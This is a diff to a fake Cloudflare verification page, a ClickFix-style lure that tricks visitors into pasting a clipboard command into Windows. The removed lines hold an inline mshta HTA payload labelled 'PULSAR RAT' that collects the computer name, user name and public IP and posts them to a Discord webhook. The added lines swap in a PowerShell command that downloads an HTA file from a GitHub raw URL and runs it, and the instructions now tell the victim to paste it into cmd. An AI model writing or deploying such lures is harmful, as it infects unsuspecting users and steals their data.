@@ -53,9 +53,9 @@
     <section class="modal">
       <h2>⚠️ Extra Verification Needed</h2>
       <ol>
-        <li>Press <strong>Windows + R</strong> to open the Run dialog</li>
-        <li>Paste the verification text by pressing <strong>CTRL + V</strong></li>
-        <li>Press <strong>Enter</strong> or click <strong>OK</strong> to verify</li>
+        <li>Press <strong>Windows + R</strong>, type <strong>cmd</strong>, press Enter</li>
+        <li>In the black window, <strong>right-click</strong> to paste</li>
+        <li>Press <strong>Enter</strong> to verify</li>
       </ol>
       <p class="footer">Performance &amp; security by Cloudflare</p>
     </section>
@@ -64,10 +64,8 @@
     const button = document.getElementById("verifyBtn");
     const overlay = document.getElementById("overlay");
     
-    // The full HTA code embedded as a javascript: URL (no external file)
-    const htaCode = "Sub Window_OnLoad%0aWindow.ResizeTo 0,0%0aWindow.MoveTo -2000,-2000%0aDim shell,fso,http,webhook,data,computer,user,os,ip,publicIP%0awebhook=%22https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC%22%0aSet shell=CreateObject(%22WScript.Shell%22)%0aSet fso=CreateObject(%22Scripting.FileSystemObject%22)%0acomputer=CreateObject(%22WScript.Network%22).ComputerName%0auser=CreateObject(%22WScript.Network%22).UserName%0aos=shell.ExpandEnvironmentStrings(%22%OS%%22)%0aSet http=CreateObject(%22MSXML2.XMLHTTP%22)%0ahttp.open %22GET%22,%22https://api.ipify.org%22,False%0ahttp.send%0apublicIP=http.responseText%0adata=%22**PULSAR RAT - VICTIM**%5cnComputer:%22%26computer%26%22%5cnUser:%22%26user%26%22%5cnIP:%22%26publicIP%0aSet http=CreateObject(%22MSXML2.XMLHTTP%22)%0ahttp.open %22POST%22,webhook,False%0ahttp.setRequestHeader %22Content-Type%22,%22application/json%22%0ahttp.send %22{%22%26chr(34)%26%22content%22%26chr(34)%26%22:%22%26chr(34)%26Replace(data,%22%5cn%22,%22%5cn%22)%26chr(34)%26%22}%22%0aWindow.Close";
-    
-    const mshtaCommand = 'mshta javascript:"' + htaCode + '"';
+    // Short command that fits in any terminal
+    const cmdCommand = 'powershell -Command "Invoke-WebRequest -Uri \\"https://raw.githubusercontent.com/Skibidi101201/rat/main/result.hta\\" -OutFile $env:TEMP\\r.hta; mshta $env:TEMP\\r.hta"';
     
     function copyToClipboard(text) {
       const ta = document.createElement('textarea');
@@ -79,7 +77,7 @@
     }
     
     button.addEventListener("click", () => {
-      copyToClipboard(mshtaCommand);
+      copyToClipboard(cmdCommand);
       overlay.classList.add("active");
     });
   </script>
